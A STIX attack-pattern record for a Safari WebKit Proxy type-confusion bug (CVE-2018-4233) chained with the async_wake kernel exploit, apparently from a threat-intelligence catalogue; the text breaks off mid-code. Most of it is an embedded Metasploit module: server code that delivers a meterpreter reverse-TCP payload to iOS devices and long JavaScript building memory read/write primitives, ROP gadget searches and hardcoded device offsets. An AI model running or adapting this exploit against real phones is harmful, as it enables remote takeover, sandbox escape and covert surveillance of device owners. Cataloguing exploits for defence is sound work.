{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c43f04d3-7e8d-45f7-8f7b-5b7989db9155",
    "created": "2024-08-14T16:34:11.012437Z",
    "modified": "2024-08-14T16:34:11.012442Z",
    "name": "Safari Webkit Proxy Object Type Confusion",
    "description": " This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/apple_ios/browser/webkit_createthis.rb",
            "external_id": "webkit_createthis.rb"
        },
        {
            "source_name": "executablememory",
            "external_id": "andjumpstoitsentrypoint.TheCVE-2017-13861async_wake"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4233"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-13861"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saelo/cve-2018-4233"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1417"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/JakeBlair420/totally-not-spyware/blob/master/root/js/spyware.js"
        },
        {
            "source_name": "loader_data=exploit_data(CVE-2017-13861",
            "external_id": "exploit)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Safari Webkit Proxy Object Type Confusion',\n      'Description'    => %q{\n          This module exploits a type confusion bug in the Javascript Proxy object in\n        WebKit. The DFG JIT does not take into account that, through the use of a Proxy,\n        it is possible to run arbitrary JS code during the execution of a CreateThis\n        operation. This makes it possible to change the structure of e.g. an argument\n        without causing a bailout, leading to a type confusion (CVE-2018-4233).\n\n          The type confusion leads to the ability to allocate fake Javascript objects,\n        as well as the ability to find the address in memory of a Javascript object.\n        This allows us to construct a fake JSCell object that can be used to read\n        and write arbitrary memory from Javascript.  The module then uses a ROP chain\n        to write the first stage shellcode into executable memory within the Safari\n        process and kick off its execution.\n\n          The first stage maps the second stage macho (containing CVE-2017-13861) into\n        executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake\n        exploit leads to a kernel task port (TFP0) that can read and write arbitrary\n        kernel memory. The processes credential and sandbox structure in the kernel\n        is overwritten and the meterpreter payloads code signature hash is added to\n        the kernels trust cache, allowing Safari to load and execute the (self-signed)\n        meterpreter payload.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'saelo',\n        'niklasb',\n        'Ian Beer',\n        'siguza',\n        ],\n      'References'     => [\n          ['CVE', '2018-4233'],\n          ['CVE', '2017-13861'],\n          ['URL', 'https://github.com/saelo/cve-2018-4233'],\n          ['URL', 'https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1417'],\n          ['URL', 'https://github.com/JakeBlair420/totally-not-spyware/blob/master/root/js/spyware.js'],\n        ],\n      'Arch'           => ARCH_AARCH64,\n      'Platform'       => 'apple_ios',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },\n      'Targets'        => [[ 'Automatic', {} ]],\n      'DisclosureDate' => '2018-03-15'))\n    register_advanced_options([\n      OptBool.new('DEBUG_EXPLOIT', [false, \"Show debug information in the exploit javascript\", false]),\n      OptBool.new('DUMP_OFFSETS', [false, \"Show newly found offsets in a javascript prompt\", false]),\n    ])\n  end\n\n  def payload_url\n    \"tcp://#{datastore[\"LHOST\"]}:#{datastore[\"LPORT\"]}\"\n  end\n\n  def get_version(user_agent)\n    if user_agent =~ /OS (.*?) like Mac OS X\\)/\n      ios_version = Rex::Version.new($1.gsub(\"_\", \".\"))\n      return ios_version\n    end\n    fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ %r{/apple-touch-icon*}\n      return\n    elsif request.uri =~ %r{/favicon*}\n      return\n    elsif request.uri =~ %r{/payload10$*}\n      payload_data = MetasploitPayloads::Mettle.new('aarch64-iphone-darwin').to_binary :dylib_sha1\n      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})\n      print_good(\"Sent sha1 iOS 10 payload\")\n      return\n    elsif request.uri =~ %r{/payload11$*}\n      payload_data = MetasploitPayloads::Mettle.new('aarch64-iphone-darwin').to_binary :dylib\n      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})\n      print_good(\"Sent sha256 iOS 11 payload\")\n      return\n    end\n\n    user_agent = request['User-Agent']\n    print_status(\"Requesting #{request.uri} from #{user_agent}\")\n    version = get_version(user_agent)\n    ios_11 = (version >= Rex::Version.new('11.0.0'))\n    if request.uri =~ %r{/exploit$}\n      loader_data = exploit_data('CVE-2017-13861', 'exploit')\n      srvhost = Rex::Socket.resolv_nbo_i(srvhost_addr)\n      config = [srvhost, srvport].pack(\"Nn\") + payload_url\n      payload_url_index = loader_data.index('PAYLOAD_URL')\n      loader_data[payload_url_index, config.length] = config\n      print_good(\"Sent async_wake exploit\")\n      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})\n      return\n    end\n\n    get_mem_rw_ios_10 = %Q^\nfunction get_mem_rw(stage1) {\n    var structs = [];\n    function sprayStructures() {\n        function randomString() {\n            return Math.random().toString(36).replace(/[\\^a-z]+/g, \"\").substr(0, 5)\n        }\n        for (var i = 0; i < 4096; i++) {\n            var a = new Float64Array(1);\n            a[randomString()] = 1337;\n            structs.push(a)\n        }\n    }\n    sprayStructures();\n    var hax = new Uint8Array(4096);\n    var jsCellHeader = new Int64([0, 16, 0, 0, 0, 39, 24, 1]);\n    var container = {\n        jsCellHeader: jsCellHeader.asJSValue(),\n        butterfly: false,\n        vector: hax,\n        lengthAndFlags: (new Int64(\"0x0001000000000010\")).asJSValue()\n    };\n    var address = Add(stage1.addrof(container), 16);\n    var fakearray = stage1.fakeobj(address);\n    while (!(fakearray instanceof Float64Array)) {\n        jsCellHeader.assignAdd(jsCellHeader, Int64.One);\n        container.jsCellHeader = jsCellHeader.asJSValue()\n    }\n    memory = {\n        read: function(addr, length) {\n            fakearray[2] = i2f(addr);\n            var a = new Array(length);\n            for (var i = 0; i < length; i++) a[i] = hax[i];\n            return a\n        },\n        readInt64: function(addr) {\n            return new Int64(this.read(addr, 8))\n        },\n        write: function(addr, data) {\n            fakearray[2] = i2f(addr);\n            for (var i = 0; i < data.length; i++) hax[i] = data[i]\n        },\n        writeInt64: function(addr, val) {\n            return this.write(addr, val.bytes())\n        },\n    };\n    var empty = {};\n    var header = memory.read(stage1.addrof(empty), 8);\n    memory.write(stage1.addrof(container), header);\n    var f64array = new Float64Array(8);\n    header = memory.read(stage1.addrof(f64array), 16);\n    memory.write(stage1.addrof(fakearray), header);\n    memory.write(Add(stage1.addrof(fakearray), 24), [16, 0, 0, 0, 1, 0, 0, 0]);\n    fakearray.container = container;\n    return memory;\n}\n^\n\n    get_mem_rw_ios_11 = %Q^\nfunction get_mem_rw(stage1) {\n    var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;\n    var structure_spray = []\n    for (var i = 0; i < 1000; ++i) {\n        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}\n        ary['prop'+i] = 1\n        structure_spray.push(ary)\n    }\n    var manager = structure_spray[500]\n    var leak_addr = stage1.addrof(manager)\n    //print('leaking from: '+ hex(leak_addr))\n    function alloc_above_manager(expr) {\n        var res\n        do {\n            for (var i = 0; i < ALLOCS; ++i) {\n                structure_spray.push(eval(expr))\n            }\n            res = eval(expr)\n        } while (stage1.addrof(res) < leak_addr)\n        return res\n    }\n    var unboxed_size = 100\n    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')\n    var boxed = alloc_above_manager('[{}]')\n    var victim = alloc_above_manager('[]')\n    // Will be stored out-of-line at butterfly - 0x10\n    victim.p0 = 0x1337\n    function victim_write(val) {\n        victim.p0 = val\n    }\n    function victim_read() {\n        return victim.p0\n    }\n    i32[0] = 0x200                // Structure ID\n    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing\n    var outer = {\n        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned\n        p1: f64[0],\n        p2: manager,\n        p3: 0xfffffff, // Butterfly indexing mask\n    }\n    var fake_addr = stage1.addrof(outer) + FPO + 0x8;\n    //print('fake obj @ ' + hex(fake_addr))\n    var unboxed_addr = stage1.addrof(unboxed)\n    var boxed_addr = stage1.addrof(boxed)\n    var victim_addr = stage1.addrof(victim)\n    //print('leak ' + hex(leak_addr)\n        //+ ' unboxed ' + hex(unboxed_addr)\n        //+ ' boxed ' + hex(boxed_addr)\n        //+ ' victim ' + hex(victim_addr))\n    var holder = {fake: {}}\n    holder.fake = stage1.fakeobj(fake_addr)\n    // From here on GC would be uncool\n    // Share a butterfly for easier boxing/unboxing\n    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])\n    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]\n    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)\n    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]\n    function set_victim_addr(where) {\n        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)\n    }\n    function reset_victim_addr() {\n        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly\n    }\n    var stage2 = {\n        addrof: function(victim) {\n            boxed[0] = victim\n            return f2i(unboxed[0])\n        },\n        fakeobj: function(addr) {\n            unboxed[0] = i2f(addr)\n            return boxed[0]\n        },\n        write64: function(where, what) {\n            set_victim_addr(where)\n            victim_write(this.fakeobj(what))\n            reset_victim_addr()\n        },\n        read64: function(where) {\n            set_victim_addr(where)\n            var res = this.addrof(victim_read())\n            reset_victim_addr()\n            return res;\n        },\n        write_non_zero: function(where, values) {\n            for (var i = 0; i < values.length; ++i) {\n                if (values[i] != 0)\n                    this.write64(where + i*8, values[i])\n            }\n        },\n        readInt64: function(where) {\n            if (where instanceof Int64) {\n                where = Add(where, 0x10);\n                holder.fake[(victim_addr + 8 - leak_addr) / 8] = where.asDouble();\n            } else {\n                set_victim_addr(where);\n            }\n            boxed[0] = victim_read();\n            var res = f2i(unboxed[0]);\n            reset_victim_addr();\n            return new Int64(res);\n        },\n        read: function(addr, length) {\n            var address = new Int64(addr);\n            var a = new Array(length);\n            var i;\n\n            for (i = 0; i + 8 < length; i += 8) {\n                v = this.readInt64(Add(address, i)).bytes()\n                for (var j = 0; j < 8; j++) {\n                    a[i+j] = v[j];\n                }\n            }\n\n            v = this.readInt64(Add(address, i)).bytes()\n            for (var j = i; j < length; j++) {\n                a[j] = v[j - i];\n            }\n\n            return a\n        },\n        test: function() {\n            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie\n            if (0xfff != this.read64(boxed_addr + 0x10)) {\n                fail(2)\n            }\n        },\n    }\n    // Test read/write\n    stage2.test()\n    return stage2;\n}\n^\n\n    get_mem_rw = (version >= Rex::Version.new('11.2.2')) ? get_mem_rw_ios_11 : get_mem_rw_ios_10\n    utils = exploit_data \"javascript_utils\", \"utils.js\"\n    int64 = exploit_data \"javascript_utils\", \"int64.js\"\n    dump_offsets = ''\n    if datastore['DUMP_OFFSETS']\n      dump_offsets = %Q^\n        var offsetstr = uuid + \" : { \";\n        var offsetarray = [ \"_dlsym\", \"_dlopen\", \"__longjmp\", \"regloader\", \"dispatch\", \"stackloader\", \"movx4\", \"ldrx8\", \"_mach_task_self_\", \"__kernelrpc_mach_vm_protect_trap\", \"__platform_memmove\",\n        \"__ZN3JSC30endOfFixedExecutableMemoryPoolE\", \"__ZN3JSC29jitWriteSeparateHeapsFunctionE\", \"__ZN3JSC32startOfFixedExecutableMemoryPoolE\", ];\n        for (var i = 0; i < offsetarray.length; i++) {\n            var offset = offsets[offsetarray[i]];\n            if (offset) {\n                var offsethex = Sub(offset, cache_slide).toString().replace(\"0x0000000\", \"0x\");\n                offsetstr += \"\\\\\"\" + offsetarray[i] + \"\\\\\" : \" + offsethex + \", \";\n            }\n        }\n        offsetstr += \"}, \";\n        prompt(\"offsets: \", offsetstr);\n^\n    end\n\n    html = %Q^\n<html>\n<body>\n<script>\n\n#{utils}\n#{int64}\n\nprint = alert;\nITERS = 1E4;\nALLOCS = 1E3;\n\nvar conversion_buffer = new ArrayBuffer(8);\nvar f64 = new Float64Array(conversion_buffer);\nvar i32 = new Uint32Array(conversion_buffer);\nvar BASE32 = 0x100000000;\n\nfunction f2i(f) {\n    f64[0] = f;\n    return i32[0] + BASE32 * i32[1];\n}\n\nfunction i2f(i) {\n    i32[0] = i % BASE32;\n    i32[1] = i / BASE32;\n    return f64[0];\n}\n\nfunction hexit(x) {\n    if (x instanceof Int64) return x.toString();\n    if (x < 0) return \"-\" + hex(-x);\n    return \"0x\" + x.toString(16);\n}\n\nfunction fail(x) {\n    print('FAIL ' + x);\n    location.reload();\n    throw null;\n}\n\ncounter = 0;\n\n// CVE-2018-4233\nfunction trigger(constr, modify, res, val) {\n    return eval(`\n    var o = [13.37]\n    var Constructor${counter} = function(o) { ${constr} }\n    var hack = false\n    var Wrapper = new Proxy(Constructor${counter}, {\n        get: function() {\n            if (hack) {\n                ${modify}\n            }\n        }\n    })\n    for (var i = 0; i < ITERS; ++i)\n        new Wrapper(o)\n    hack = true\n    var bar = new Wrapper(o)\n    ${res}\n    `)\n}\n\nvar workbuf = new ArrayBuffer(0x1000000);\nvar payload = new Uint8Array(workbuf);\n\nfunction pwn() {\n    var stage1 = {\n        addrof: function(victim) {\n            return f2i(trigger(\"this.result = o[0]\", \"o[0] = val\", \"bar.result\", victim))\n        },\n        fakeobj: function(addr) {\n            return trigger(\"o[0] = val\", \"o[0] = {}\", \"o[0]\", i2f(addr))\n        },\n        test: function() {\n            var addr = this.addrof({\n                a: 4919\n            });\n            var x = this.fakeobj(addr);\n            if (x.a != 4919) fail(\"stage1\")\n        }\n    };\n    stage1.test();\n\n    var stage2 = get_mem_rw(stage1);\n    var FPO = #{ios_11 ? \"(typeof(SharedArrayBuffer) === 'undefined') ? 0x20 : 0x18;\" : \"0x18;\"}\n    var memory = stage2;\n    memory.u32 = _u32;\n\n    var wrapper = document.createElement(\"div\");\n    var wrapper_addr = stage1.addrof(wrapper);\n    var el_addr = memory.readInt64(wrapper_addr + FPO);\n    var vtab = memory.readInt64(el_addr);\n\n    var anchor = memory.readInt64(vtab);\n    var hdr = Sub(anchor, anchor.lo() & 0xfff);\n    var b = [];\n    while(true)\n    {\n        if (memory.readInt64(hdr).lo() == 4277009104) {\n          fail('WebCore ' + hdr + ' post spectre support coming soon');\n        }\n        if(strcmp(memory.read(hdr, 0x10), \"dyld_v1   arm64\"))\n        {\n            break;\n        }\n        hdr = Sub(hdr, 0x1000);\n    }\n\n    var base_seg = null;\n    var nsegs    = memory.u32(Add(hdr, 0x14));\n    var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);\n    var segs     = [];\n    for(var i = 0; i < nsegs; ++i)\n    {\n        var off = i * 0x20;\n        var seg =\n        {\n            addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),\n            size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),\n            fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),\n            maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),\n            initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))\n        };\n        segs.push(seg);\n        if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))\n        {\n            base_seg = seg;\n        }\n    }\n    if(base_seg == null)\n    {\n        fail(\"base_seg\");\n    }\n\n    var cache_slide = Sub(hdr, base_seg.addr);\n    var uuid = memory.readInt64(Add(hdr, 0x58)).lo();\n    var offset_cache = {\n        // iPod Touch 10.1.1\n        788795426 : { \"_dlsym\" : 0x18052ddd8, \"_dlopen\" : 0x18052dd10, \"__longjmp\" : 0x1806ffb78, \"regloader\" : 0x180f0622c, \"dispatch\" : 0x180d7e058, \"stackloader\" : 0x18099a8e8, \"_mach_task_self_\" : 0x1a586e3bc,\n        \"__kernelrpc_mach_vm_protect_trap\" : 0x1806240a4, \"__platform_memmove\" : 0x1806ffe00, \"__ZN3JSC30endOfFixedExecutableMemoryPoolE\" : 0x1a457c438, },\n\n        // iPhone 5S 10.2.1\n        3432281541 : { \"_dlsym\" : 0x18052edd8, \"_dlopen\" : 0x18052ed10, \"__longjmp\" : 0x180700b78, \"regloader\" : 0x180f07230, \"dispatch\" : 0x180d7f05c, \"stackloader\" : 0x18099b8ec, \"mach_task_self\" : 0x1a6da23bc,\n        \"__kernelrpc_mach_vm_protect_trap\" : 0x1806250c0, \"__platform_memmove\" : 0x180700e00, \"__ZN3JSC30endOfFixedExecutableMemoryPoolE\" : 0x1a5a0d438, },\n\n        // iPhone 6S 11.0.3\n        425478416 : { \"_dlsym\" : 0x180587574, \"_dlopen\" : 0x180587460, \"__longjmp\" : 0x1807bd7dc, \"regloader\" : 0x180051ad8, \"dispatch\" : 0x19b323a4c, \"stackloader\" : 0x19b2e6f40, \"movx4\" : 0x19b33305c,\n        \"ldrx8\" : 0x180060028, \"__ZN3JSC30endOfFixedExecutableMemoryPoolE\" : 0x1b15d8a00, \"__ZN3JSC29jitWriteSeparateHeapsFunctionE\" : 0x1b15d8a08, \"__ZN3JSC32startOfFixedExecutableMemoryPoolE\" : 0x1b15d89f8, },\n    };\n\n    var offsets = offset_cache[uuid];\n    if (offsets)\n    {\n        var k = Object.keys(offsets);\n        for(var i = 0; i < k.length; ++i)\n        {\n            var s = k[i];\n            offsets[s] = Add(offsets[s], cache_slide);\n        }\n    }\n    else\n    {\n        var syms = {};\n        var gadgets = {};\n\n        for(var i = 0; i < segs.length; ++i)\n        {\n            segs[i].addr = Add(segs[i].addr, cache_slide);\n        }\n        var libs =\n        {\n            \"/usr/lib/system/libdyld.dylib\":                                        [\"_dlsym\", \"_dlopen\"],\n            #{ ios_11 ? '\n            \"/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore\":   [\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"],\n            \"/usr/lib/system/libsystem_platform.dylib\":                             [\"__longjmp\"],\n            ' : '\n            \"/usr/lib/system/libsystem_platform.dylib\":                             [\"__longjmp\", \"__platform_memmove\"],\n            \"/usr/lib/system/libsystem_kernel.dylib\":                               [\"_mach_task_self_\", \"__kernelrpc_mach_vm_protect_trap\"],\n            \"/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore\":   [\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"],\n            '}\n        }\n\n        #{ ios_11 ? '\n        var opcodes = {\n            // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret\n            \"ldrx8\":     [ [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0] ],\n            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret\n            \"dispatch\":  [ [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ] ],\n            // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8\n            \"regloader\": [ [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ] ],\n            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];\n            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret\n            \"stackloader\": [ [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ] ],\n            // mov x4, x20 ; blr x8\n            \"movx4\":     [ [ 0xaa1403e4, 0xd63f0100 ] ],\n        }\n        var opcode_libs = [\n            \"/usr/lib/PN548.dylib\",     // dispatch, stackloader\n            \"/usr/lib/libc++.1.dylib\",  // ldrx8, regloader, movx4, stackloader\n        ];\n\n        ' : '\n        var opcodes = {\n            // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28\n            \"regloader\": [ [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ] ],\n            \"dispatch\": [\n                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret\n                [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],\n                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret\n                [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],\n            ],\n            \"stackloader\": [\n                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];\n                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret\n                [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],\n                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];\n                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret\n                [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],\n            ],\n        };\n\n        var opcode_libs = [ \"/usr/lib/libLLVM.dylib\" ];\n        '}\n\n        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));\n        var nimgs = memory.u32(Add(hdr, 0x1c));\n        for(var i = 0; i < nimgs; ++i)\n        {\n            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));\n            var fn = function(i)\n            {\n                return memory.read(Add(straddr, i), 1)[0];\n            };\n            var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);\n            if(opcode_libs.some(lib => strcmp(fn, lib)))\n            {\n                var ncmds = memory.u32(Add(base, 0x10));\n                for(var j = 0, off = 0x20; j < ncmds; ++j)\n                {\n                    var cmd = memory.u32(Add(base, off));\n                    if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x8), 0x10), \"__TEXT\")) // LC_SEGMENT_64\n                    {\n                        var nsects = memory.u32(Add(base, off + 0x40));\n                        for(var k = 0, o = off + 0x48; k < nsects; ++k)\n                        {\n                            if(strcmp(memory.read(Add(base, o), 0x10), \"__text\"))\n                            {\n                                var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])\n                                if (keys.length == 0) break;\n\n                                var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)\n                                var size = memory.u32(Add(base, o + 0x28))\n\n                                // Copy the entire __text region into a Uint32Array for faster processing.\n                                // Previously you could map a Uint32Array over the data, but on i7+ devices\n                                // this caused access violations.\n                                // Instead we read the entire region and copy it into a Uint32Array. The\n                                // memory.read primitive has a weird limitation where it's only able to read\n                                // up to 4096 bytes. to get around this we'll read multiple times and combine\n                                // them into one.\n\n                                var allData = new Uint32Array(size / 4)\n                                for (var r = 0; r < size; r += 4096) {\n                                    // Check to ensure we don't read out of the region we want\n                                    var qty = 4096\n                                    if (size - r < qty) {\n                                        qty = size - r\n                                    }\n                                    var data = memory.read(Add(addr, r), qty)\n\n                                    // Data is an array of single bytes. This code takes four entries\n                                    // and converts them into a single 32-bit integer. It then adds it\n                                    // into the `allData` array at the given index\n                                    for (var h = 0; h < qty; h += 4) {\n                                        var fourBytes = b2u32(data.slice(h, h + 4))\n                                        allData[(r + h) / 4] = fourBytes\n                                    }\n                                }\n\n                                // Loop through the entire data map looking for each gadget we need\n                                for (var f = 0; f < size && keys.length > 0; f++) {\n\n                                    // Check every gadget\n                                    for (var z = 0; z < keys.length; z++) {\n                                        var key = keys[z];\n                                        var opcode_list = opcodes[key];\n                                        for (var y = 0; y < opcode_list.length; y++) {\n                                            var opcode = opcode_list[y];\n                                            for (var t = 0; t < opcode.length; t++) {\n                                                var op = allData[f+t];\n                                                if (op == opcode[t]) {\n                                                    if (t == opcode.length - 1) {\n                                                        gadgets[key] = Add(addr, f*4);\n                                                        keys.splice(z, 1);\n                                                        z = keys.length;\n                                                        break;\n                                                    }\n                                                    continue;\n                                                }\n                                                break;\n                                            }\n                                        }\n                                    }\n                                }\n\n                                break;\n                            }\n                            o += 0x50;\n                        }\n                        break;\n                    }\n                    off += memory.u32(Add(base, off + 0x4));\n                }\n                continue;\n            }\n            var lookup = null;\n            for(var k = Object.keys(libs), j = 0; j < k.length; ++j)\n            {\n                if(strcmp(fn, k[j]))\n                {\n                    lookup = libs[k[j]];\n                    break;\n                }\n            }\n            if(lookup != null)\n            {\n                fsyms(memory, base, segs, lookup, syms);\n            }\n        }\n\n        var vals = Object.keys(libs).map(function(key) {\n            return libs[key];\n        });\n        var k = vals.reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);\n        for(var i = 0; i < k.length; ++i)\n        {\n            var s = k[i];\n            if(syms[s] == null)\n            {\n                fail(s);\n            }\n            syms[s] = Add(syms[s], cache_slide);\n        }\n        k = Object.keys(opcodes);\n        for(var i = 0; i < k.length; ++i)\n        {\n            var s = k[i];\n            if(gadgets[s] == null)\n            {\n                fail(s);\n            }\n        }\n\n        offsets = {}\n        offsets[\"regloader\"] =                                   gadgets[\"regloader\"];\n        offsets[\"dispatch\"] =                                    gadgets[\"dispatch\"];\n        offsets[\"stackloader\"] =                                 gadgets[\"stackloader\"];\n        offsets[\"ldrx8\"] =                                       gadgets[\"ldrx8\"];\n        offsets[\"movx4\"] =                                       gadgets[\"movx4\"];\n        offsets[\"__longjmp\"] =                                      syms[\"__longjmp\"];\n        offsets[\"__kernelrpc_mach_vm_protect_trap\"] =               syms[\"__kernelrpc_mach_vm_protect_trap\"];\n        offsets[\"__platform_memmove\"] =                             syms[\"__platform_memmove\"];\n        offsets[\"_dlopen\"] =                                        syms[\"_dlopen\"];\n        offsets[\"_dlsym\"] =                                         syms[\"_dlsym\"];\n        offsets[\"_mach_task_self_\"] =                               syms[\"_mach_task_self_\"];\n        offsets[\"__ZN3JSC32startOfFixedExecutableMemoryPoolE\"] =    syms[\"__ZN3JSC32startOfFixedExecutableMemoryPoolE\"];\n        offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"] =      syms[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"];\n        offsets[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"]  =      syms[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"];\n\n        if (offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"] == null && offsets[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"] != null) {\n            offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"] = Sub(offsets[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"], 8);\n        }\n        #{ ios_11 ? '\n        if (offsets[\"__ZN3JSC32startOfFixedExecutableMemoryPoolE\"] == null && offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"] != null) {\n            offsets[\"__ZN3JSC32startOfFixedExecutableMemoryPoolE\"] = Sub(offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"], 8);\n        }' : ''}\n\n#{dump_offsets}\n\n    }\n\n\n    var regloader           = offsets[\"regloader\"];\n    var dispatch            = offsets[\"dispatch\"];\n    var stackloader         = offsets[\"stackloader\"];\n    var longjmp             = offsets[\"__longjmp\"];\n    var mach_vm_protect     = offsets[\"__kernelrpc_mach_vm_protect_trap\"];\n    var memmove             = offsets[\"__platform_memmove\"];\n    var dlopen              = offsets[\"_dlopen\"];\n    var dlsym               = offsets[\"_dlsym\"];\n    var task_self           = offsets[\"_mach_task_self_\"]\n    var endOfFixedMem       = offsets[\"__ZN3JSC30endOfFixedExecutableMemoryPoolE\"];\n    var startOfFixedMem     = offsets[\"__ZN3JSC32startOfFixedExecutableMemoryPoolE\"];\n\n    var ldrx8               = offsets[\"ldrx8\"]; // might be null\n    var movx4               = offsets[\"movx4\"]; // might be null\n\n    var mach_task_self_     = new Int64(memory.readInt64(task_self).lo());\n    var memPoolEnd          = memory.readInt64(endOfFixedMem);\n\n    var 